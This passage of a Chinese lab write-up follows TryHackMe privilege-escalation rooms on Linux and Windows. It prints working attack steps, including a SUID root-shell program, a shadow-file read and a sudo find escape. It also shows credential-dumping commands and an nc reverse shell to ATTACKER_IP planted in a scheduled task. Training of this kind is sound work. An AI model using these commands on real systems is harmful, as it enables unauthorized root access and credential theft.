<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002125629655.png"></p>
<h4 id="Task8-PATH"><a href="#Task8-PATH" class="headerlink" title="Task8 PATH"></a>Task8 PATH</h4><p>如果您的用户具有写入权限的文件夹位于路径中，您可能会劫持应用程序来运行脚本。 Linux 中的 PATH 是一个环境变量，它告诉操作系统在哪里搜索可执行文件。对于任何未内置到 shell  中或未定义绝对路径的命令，Linux 将开始在 PATH 下定义的文件夹中搜索。 （PATH是我们这里讨论的环境变量，path是文件的位置）。</p>
<p>如果我们在命令行中输入“thm”， Linux将在这些位置查找名为 thm 的可执行文件。下面的场景将使您更好地了解如何利用它来提高我们的特权级别。正如您将看到的，这完全取决于目标系统的现有配置，因此在尝试此操作之前，请确保您可以回答以下问题。</p>
<ol>
<li>$PATH 下有哪些文件夹</li>
<li>您当前的用户是否具有这些文件夹的写入权限？</li>
<li>可以修改$PATH吗？</li>
<li>您可以启动的脚本&#x2F;应用程序是否会受到此漏洞的影响？</li>
</ol>
<p>出于演示目的，我们将使用以下脚本：</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002130704075.png"></p>
<p>该脚本尝试启动一个名为“thm”的系统二进制文件，但该示例可以轻松地用任何二进制文件复制。</p>
<p>我们将其编译为可执行文件并设置 SUID 位。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002130732512.png"></p>
<p>我们的用户现在可以访问设置了 SUID 位的“path”脚本。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002130751683.png"></p>
<p>执行后，“path”将在 PATH 下列出的文件夹中查找名为“thm”的可执行文件。</p>
<p>如果 PATH 下列出了任何可写文件夹，我们可以在该目录下创建一个名为 thm 的二进制文件，并让我们的“path”脚本运行它。设置 SUID 位后，该二进制文件将以 root 权限运行</p>
<p>可以使用以下命令对可写文件夹进行简单搜索。可以使用简单的剪切和排序序列来清理此命令的输出。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002130931050.png"></p>
<p>我们在 &#x2F;usr 下看到许多文件夹，因此再次运行可写文件夹搜索以覆盖子文件夹可能会更容易。</p>
<p>另一种选择是使用下面的命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null | cut -d &quot;/&quot; -f 2,3 | grep -v proc | sort -u</span><br></pre></td></tr></table></figure>

<p>我们添加了“grep -v proc”来消除与运行进程相关的许多结果。不幸的是，&#x2F;usr下的子文件夹不可写</p>
<p>更容易写入的文件夹可能是 &#x2F;tmp。此时，由于 PATH 中不存在 &#x2F;tmp，因此我们需要添加它</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=/tmp:$PATH</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002131055630.png"></p>
<p>此时，路径脚本还将在 &#x2F;tmp 文件夹下查找名为“thm”的可执行文件。我们创建thm文件并写入<code>/bin/bash</code>即可，然后再赋予执行权限</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002131206428.png"></p>
<p>打开靶机ssh连接，查看可写文件夹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002131612819.png"></p>
<p>注意到<code>/home/murdoch</code>拥有可写权限，访问发现存在thm.py调用thm二进制文件</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002133051337.png"></p>
<p>不过这里不能直接执行thm.py，是通过具有SUID位的test二进制文件调用的</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002133938265.png"></p>
<p>我们添加下PATH环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=/home/murdoch:$PATH</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002134039488.png"></p>
<p>然后在<code>/home/murdoch</code>下创建thm恶意文件，然后赋予执行权限后，执行test二进制文件即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002134200271.png"></p>
<h4 id="Task9-NFS"><a href="#Task9-NFS" class="headerlink" title="Task9 NFS"></a>Task9 NFS</h4><p>权限升级载体不仅限于内部访问。共享文件夹和远程管理界面（例如SSH和 Telnet）还可以帮助您获得目标系统的 root 访问权限。某些情况下还需要使用这两个向量，例如在目标系统上查找 root SSH私钥并通过SSH以 root 权限进行连接，而不是尝试提高当前用户的权限级别。</p>
<p>与 CTF 和考试更相关的另一个载体是配置错误的网络 shell。当存在网络备份系统时，有时可以在渗透测试期间看到此载体。</p>
<p>NFS（网络文件共享）配置保存在 &#x2F;etc&#x2F;exports 文件中。该文件是在 NFS 服务器安装期间创建的，通常可供用户读取。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002140242322.png"></p>
<p>此权限升级载体的关键元素是您在上面看到的“no_root_squash”选项。默认情况下，NFS 会将 root 用户更改为 nfsnobody，并禁止以 root  权限操作任何文件。如果可写共享上存在“no_root_squash”选项，我们可以创建一个设置了 SUID 位的可执行文件并在目标系统上运行它。</p>
<p>我们将首先枚举攻击机器上的可挂载共享。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002140412935.png"></p>
<p>我们将把“no_root_squash”共享之一挂载到我们的攻击机器上并开始构建我们的可执行文件。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002140721797.png"></p>
<p>由于我们可以设置 SUID 位，因此在目标系统上运行 &#x2F;bin&#x2F;bash 的简单可执行文件将完成这项工作。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002140927656.png"></p>
<p>编译代码后，我们将设置 SUID 位。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002140951745.png"></p>
<p>您将在下面看到这两个文件（nfs.c 和 nfs 都存在于目标系统上。我们已经处理了已安装的共享，因此无需传输它们）。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002141038493.png"></p>
<p>请注意，nfs 可执行文件在目标系统上设置了 SUID 位，并以 root 权限运行。</p>
<p>打开靶机，我们先查看靶机的可挂载共享</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002151833194.png"></p>
<p>ssh连接靶机查看</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002151922174.png"></p>
<p>那么选择<code>/tmp</code>挂载到我们的<code>/tmp/hacker</code>下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -o rw 10.10.144.39:/tmp /tmp/hacker</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002151749512.png"></p>
<p>然后在本地创建nfs.c后编译</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>赋予SUID位，然后在靶机执行即可</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002152334505.png"></p>
<h4 id="Task10-challenge"><a href="#Task10-challenge" class="headerlink" title="Task10 challenge"></a>Task10 challenge</h4><p>ssh登录leonard用户，发现<code>/home</code>目录下存在三个账户</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002153529424.png"></p>
<p>看看有什么SUID位的文件可以利用，发现base64命令</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002153629321.png"></p>
<p>使用base64命令读取下<code>/etc/shadow</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/base64 /etc/shadow | base64 --decode</span><br></pre></td></tr></table></figure>

<p>发现刚好有missy用户的密码，用john爆破得到<code>Password1</code></p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002153743615.png"></p>
<p>ssh登录missy用户，成功拿到flag1</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002154147885.png"></p>
<p>尝试sudo提权，发现有find命令</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002154435253.png"></p>
<p>成功提权，拿到flag2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/find . -exec /bin/sh \; -quit</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002154843132.png"></p>
<h3 id="Windows-权限提升"><a href="#Windows-权限提升" class="headerlink" title="Windows 权限提升"></a>Windows 权限提升</h3><h4 id="Task1-基本概念"><a href="#Task1-基本概念" class="headerlink" title="Task1 基本概念"></a>Task1 基本概念</h4><p>简而言之，权限升级包括使用“用户 A”对主机的给定访问权限，并通过滥用目标系统中的弱点来利用它来获得对“用户 B”的访问权限。虽然我们通常希望“用户 B”拥有管理权限，但在某些情况下，我们可能需要升级到其他非特权帐户，然后才能真正获得管理权限。</p>
<p>获取对不同帐户的访问权限就像在某些粗心用户留下的不安全的文本文件或电子表格中查找凭据一样简单，但情况并非总是如此。根据具体情况，我们可能需要利用以下一些弱点：</p>
<ul>
<li>Windows 服务或计划任务配置错误</li>
<li>分配给我们帐户的权限过多</li>
<li>易受攻击的软件</li>
<li>缺少 Windows 安全补丁</li>
</ul>
<p>在开始讨论实际技术之前，让我们先了解一下 Windows 系统上的不同帐户类型。</p>
<p><strong>Windows 用户</strong></p>
<p>Windows系统主要有两类用户。根据用户的访问级别，我们可以将用户分为以下组之一：</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><strong>管理员</strong></td>
<td>这些用户拥有最多的权限。他们可以更改任何系统配置参数并访问系统中的任何文件。</td>
</tr>
<tr>
<td><strong>标准用户</strong></td>
<td>这些用户可以访问计算机，但只能执行有限的任务。通常，这些用户无法对系统进行永久或重要的更改，并且仅限于他们的文件。</td>
</tr>
</tbody></table>
<p>任何具有管理权限的用户都将成为<strong>管理员</strong>组的一部分。另一方面，标准用户是<strong>用户</strong>组的一部分。</p>
<p>除此之外，您通常会听说操作系统在权限升级的情况下使用一些特殊的内置帐户：</p>
<table>
<thead>
<tr>
<th><strong>系统&#x2F;本地系统</strong></th>
<th>操作系统用来执行内部任务的帐户。它可以完全访问主机上可用的所有文件和资源，并且具有比管理员更高的权限。</th>
</tr>
</thead>
<tbody><tr>
<td><strong>本地服务</strong></td>
<td>用于以“最低”权限运行 Windows 服务的默认帐户。它将使用网络上的匿名连接。</td>
</tr>
<tr>
<td><strong>网络服务</strong></td>
<td>用于以“最低”权限运行 Windows 服务的默认帐户。它将使用计算机凭据通过网络进行身份验证。</td>
</tr>
</tbody></table>
<p>这些帐户由 Windows 创建和管理，您将无法像其他常规帐户一样使用它们。不过，在某些情况下，您可能会因为利用特定服务而获得他们的特权。</p>
<h4 id="Task2-信息搜集"><a href="#Task2-信息搜集" class="headerlink" title="Task2 信息搜集"></a>Task2 信息搜集</h4><h5 id="无人值守的-Windows-安装"><a href="#无人值守的-Windows-安装" class="headerlink" title="无人值守的 Windows 安装"></a>无人值守的 Windows 安装</h5><p>在大量主机上安装 Windows 时，管理员可以使用 Windows  部署服务，该服务允许通过网络将单个操作系统映像部署到多台主机。此类安装称为无人值守安装，因为它们不需要用户交互。此类安装需要使用管理员帐户来执行初始设置，该设置最终可能存储在计算机中的以下位置：</p>
<ul>
<li>C:\Unattend.xml</li>
<li>C:\Windows\Panther\Unattend.xml</li>
<li>C:\Windows\Panther\Unattend\Unattend.xml</li>
<li>C:\Windows\system32\sysprep.inf</li>
<li>C:\Windows\system32\sysprep\sysprep.xml</li>
</ul>
<p>作为这些文件的一部分，您可能会遇到凭据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Credentials&gt;</span><br><span class="line">    &lt;Username&gt;Administrator&lt;/Username&gt;</span><br><span class="line">    &lt;Domain&gt;thm.local&lt;/Domain&gt;</span><br><span class="line">    &lt;Password&gt;MyPassword123&lt;/Password&gt;</span><br><span class="line">&lt;/Credentials&gt;</span><br></pre></td></tr></table></figure>



<h5 id="Powershell-历史"><a href="#Powershell-历史" class="headerlink" title="Powershell 历史"></a>Powershell 历史</h5><p>每当用户使用 Powershell 运行命令时，它都会存储到一个文件中，该文件会保留过去的命令。这对于快速重复之前使用过的命令很有用。如果用户直接在 Powershell 命令行中运行包含密码的命令，则稍后可以在<code>cmd.exe</code>提示符下使用以下命令来检索该密码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong>上面的命令只能在 cmd.exe 中运行，因为 Powershell 不会将<code>%userprofile%</code>识别为环境变量。要从 Powershell 读取该文件，您必须将<code>%userprofile%</code>替换为<code>$Env:userprofile</code> 。</p>
<h5 id="保存的-Windows-凭据"><a href="#保存的-Windows-凭据" class="headerlink" title="保存的 Windows 凭据"></a>保存的 Windows 凭据</h5><p>Windows 允许我们使用其他用户的凭据。此功能还提供了将这些凭据保存在系统上的选项。下面的命令将列出保存的凭据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure>

<p>虽然您看不到实际的密码，但如果您发现任何值得尝试的凭据，您可以将它们与<code>runas</code>命令和<code>/savecred</code>选项一起使用，如下所示。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /savecred /user:admin cmd.exe</span><br></pre></td></tr></table></figure>



<h5 id="IIS-配置"><a href="#IIS-配置" class="headerlink" title="IIS 配置"></a>IIS 配置</h5><p>Internet 信息服务 (IIS) 是 Windows 安装上的默认 Web 服务器。 IIS 上网站的配置存储在名为<code>web.config</code>的文件中，并且可以存储数据库的密码或配置的身份验证机制。根据安装的 IIS 版本，我们可以在以下位置之一找到 web.config：</p>
<ul>
<li>C:\inetpub\wwwroot\web.config</li>
<li>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</li>
</ul>
<p>这是在文件上查找数据库连接字符串的快速方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString</span><br></pre></td></tr></table></figure>



<h5 id="从软件检索凭证：PuTTY"><a href="#从软件检索凭证：PuTTY" class="headerlink" title="从软件检索凭证：PuTTY"></a>从软件检索凭证：PuTTY</h5><p>PuTTY 是 Windows 系统上常见的 SSH 客户端。用户不必每次都指定连接参数，而是可以存储会话，其中可以存储 IP、用户和其他配置以供以后使用。虽然 PuTTY 不允许用户存储其SSH密码，但它将存储包含明文身份验证凭据的代理配置。</p>
<p>要检索存储的代理凭据，您可以使用以下命令在以下注册表项下搜索 ProxyPassword：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &quot;Proxy&quot; /s</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong> Simon Tatham 是 PuTTY 的创建者（他的名字是路径的一部分），而不是我们要检索密码的用户名。运行上述命令后，存储的代理用户名也应该可见。</p>
<p>正如 putty 存储凭据一样，任何存储密码的软件，包括浏览器、电子邮件客户端、 FTP客户端、 SSH客户端、VNC 软件等，都将有方法恢复用户保存的任何密码。</p>
<p>打开靶机，RDP远程连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:10.10.103.83 /u:thm-unpriv /p:Password321</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004173401232.png"></p>
<p>找到存储在powershell的密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004174005931.png"></p>
<p>​	继续找到与 IIS 关联的 web.config 文件中的密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004174301641.png"></p>
<p>查看下保存的登录凭据，配合<code>/savecred</code>参数直接无密码登录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /list</span><br><span class="line">runas /savecred /user:WPRIVESC1\mike.katz cmd.exe</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004174549976.png"></p>
<p>查看存储的代理凭据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &quot;Proxy&quot; /s</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004175358195.png"></p>
<h4 id="Task3-计划任务"><a href="#Task3-计划任务" class="headerlink" title="Task3 计划任务"></a>Task3 计划任务</h4><p>查看目标系统上的计划任务，您可能会看到计划任务丢失了其二进制文件或正在使用您可以修改的二进制文件。</p>
<p>可以使用不带任何选项的<code>schtasks</code>命令从命令行列出计划任务。要检索有关任何服务的详细信息，您可以使用如下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; schtasks /query /tn vulntask /fo list /v</span><br><span class="line">Folder: \</span><br><span class="line">HostName:                             THM-PC1</span><br><span class="line">TaskName:                             \vulntask</span><br><span class="line">Task To Run:                          C:\tasks\schtask.bat</span><br><span class="line">Run As User:                          taskusr1</span><br></pre></td></tr></table></figure>

<p>您将获得有关该任务的大量信息，但对我们来说重要的是“要运行的任务”参数，该参数指示计划任务执行的内容，以及“以用户身份运行”参数，该参数显示将使用的用户执行任务。</p>
<p>如果我们当前的用户可以修改或覆盖“要运行的任务”可执行文件，我们就可以控制 taskusr1 用户执行的内容，从而实现简单的权限提升。要检查可执行文件的文件权限，我们使用<code>icacls</code> ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; icacls c:\tasks\schtask.bat</span><br><span class="line">c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)</span><br><span class="line">                    BUILTIN\Administrators:(I)(F)</span><br><span class="line">                    BUILTIN\Users:(I)(F)</span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<p>从结果中可以看出， <strong>BUILTIN\Users</strong>组对任务的二进制文件具有完全访问权限 (F)。这意味着我们可以修改 .bat 文件并插入我们喜欢的任何有效负载。为了您的方便， <code>nc64.exe</code>可以在<code>C:\tools</code>中找到。让我们更改 bat 文件以生成反向 shell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 &gt; C:\tasks\schtask.bat        </span><br></pre></td></tr></table></figure>

<p>然后，我们在攻击者机器上启动一个侦听器，该侦听器位于我们在反向 shell 上指示的同一端口上：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>

<p>下次运行计划任务时，您应该会收到具有taskusr1权限的反向shell。虽然您可能无法在实际场景中启动任务，而必须等待计划任务触发，但我们为您的用户提供了手动启动任务的权限，以节省您的时间。我们可以使用以下命令运行该任务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /run /tn vulntask</span><br></pre></td></tr></table></figure>

<p>打开靶机，RDP连接查看下计划任务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /tn vulntask /fo list /v</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004180935425.png"></p>
<p>查看该文件的执行权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls C:\tasks\schtask.bat</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004181111230.png"></p>
<p>手动启用计划任务，监听4444端口拿到shell</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004181437145.png"></p>
<h4 id="Task4-始终安装提升"><a href="#Task4-始终安装提升" class="headerlink" title="Task4 始终安装提升"></a>Task4 始终安装提升</h4><p>Windows 安装程序文件（也称为 .msi 文件）用于在系统上安装应用程序。它们通常以启动它的用户的权限级别运行。但是，可以将它们配置为从任何用户帐户（甚至是非特权帐户）以更高的权限运行。这可能会让我们生成一个以管理员权限运行的恶意 MSI 文件。</p>
<p><strong>注意：</strong> AlwaysInstallElevated 方法在此房间的计算机上不起作用，它仅供参考。</p>
<p>此方法需要设置两个注册表值。您可以使用以下命令从命令行查询这些内容。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line">C:\&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer     </span><br></pre></td></tr></table></figure>

<p>为了能够利用此漏洞，两者都应该设置。否则，利用将是不可能的。如果设置了这些，您可以使用<code>msfvenom</code>生成恶意 .msi 文件，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi</span><br></pre></td></tr></table></figure>

<p>由于这是一个反向 shell，您还应该运行相应配置的Metasploit处理程序模块。传输创建的文件后，您可以使用以下命令运行安装程序并接收反向 shell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi</span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<h4 id="Task5-滥用服务错误配置"><a href="#Task5-滥用服务错误配置" class="headerlink" title="Task5 滥用服务错误配置"></a>Task5 滥用服务错误配置</h4><h5 id="Windows-服务"><a href="#Windows-服务" class="headerlink" title="Windows 服务"></a>Windows 服务</h5><p>Windows 服务由<strong>服务控制管理器</strong>(SCM) 管理。 SCM 是一个负责根据需要管理服务状态、检查任何给定服务的当前状态并通常提供配置服务的方法的进程。</p>
<p>Windows 计算机上的每个服务都有一个关联的可执行文件，每当服务启动时，SCM 都会运行该可执行文件。需要注意的是，服务可执行文件实现特殊功能以便能够与  SCM 通信，因此任何可执行文件都不能作为服务成功启动。每个服务还指定该服务将在其下运行的用户帐户。</p>
<p>为了更好地理解服务的结构，让我们使用<code>sc qc</code>命令检查 apphostsvc 服务配置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; sc qc apphostsvc</span><br><span class="line">[SC] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: apphostsvc</span><br><span class="line">        TYPE               : 20  WIN32_SHARE_PROCESS</span><br><span class="line">        START_TYPE         : 2   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : Application Host Helper Service</span><br><span class="line">        DEPENDENCIES       :</span><br><span class="line">        SERVICE_START_NAME : localSystem</span><br></pre></td></tr></table></figure>

<p>在这里我们可以看到关联的可执行文件是通过<strong>BINARY_PATH_NAME</strong>参数指定的，用于运行服务的帐户显示在<strong>SERVICE_START_NAME</strong>参数上。</p>
<p>服务具有自主访问控制列表 (DACL)，它指示谁有权启动、停止、暂停、查询状态、查询配置或重新配置服务以及其他权限。 DACL 可以从 Process Hacker 中看到（可以在您的计算机桌面上找到）：</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004182204499.png"></p>
<p>所有服务配置都存储在注册表中 <code>HKLM\SYSTEM\CurrentControlSet\Services\</code> :</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004182218058.png"></p>
<p>系统中的每个服务都存在一个子项。同样，我们可以在<strong>ImagePath</strong>值上看到关联的可执行文件，并在<strong>ObjectName</strong>值上看到用于启动服务的帐户。如果已为服务配置了DACL ，它将存储在名为<strong>Security</strong>的子项中。正如您现在已经猜到的，默认情况下只有管理员可以修改此类注册表项。</p>
<h5 id="服务可执行文件的不安全权限"><a href="#服务可执行文件的不安全权限" class="headerlink" title="服务可执行文件的不安全权限"></a>服务可执行文件的不安全权限</h5><p>如果与服务关联的可执行文件的权限较弱，允许攻击者修改或替换它，则攻击者可以轻松获得该服务帐户的权限。</p>
<p>为了了解其工作原理，让我们看一下 Splinterware System Scheduler 上发现的漏洞。首先，我们将使用<code>sc</code>查询服务配置：</p>
